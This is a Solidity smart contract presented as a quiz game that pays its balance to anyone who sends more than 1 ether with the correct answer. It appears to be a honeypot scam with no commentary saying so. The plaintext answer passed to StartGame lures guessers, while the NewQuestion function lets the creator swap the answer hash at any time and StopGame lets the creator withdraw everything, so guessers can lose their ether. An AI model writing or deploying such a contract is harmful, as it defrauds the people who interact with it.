1 pragma solidity ^0.4.19;
2 
3 contract QuizTime
4 {
5     bytes32 responseHash;
6     address questionSender;
7     string public question;
8  
9     function Guess(string answer)
10     public payable {
11         if (responseHash == keccak256(answer) && msg.value>1 ether) {
12             msg.sender.transfer(this.balance);
13         }
14     }
15  
16     function StartGame(string _question, string response)
17     public payable {
18         if (responseHash==0x0) {
19             responseHash = keccak256(response);
20             question = _question;
21             questionSender = msg.sender;
22         }
23     }
24 
25     function StopGame()
26     public payable {
27         if (msg.sender==questionSender) {
28             msg.sender.transfer(this.balance);
29         }
30     }
31 
32     function NewQuestion(string _question, bytes32 _responseHash)
33     public payable {
34         if (msg.sender==questionSender) {
35             question = _question;
36             responseHash = _responseHash;
37         }
38     }
39 
40     function () public payable { }
41 }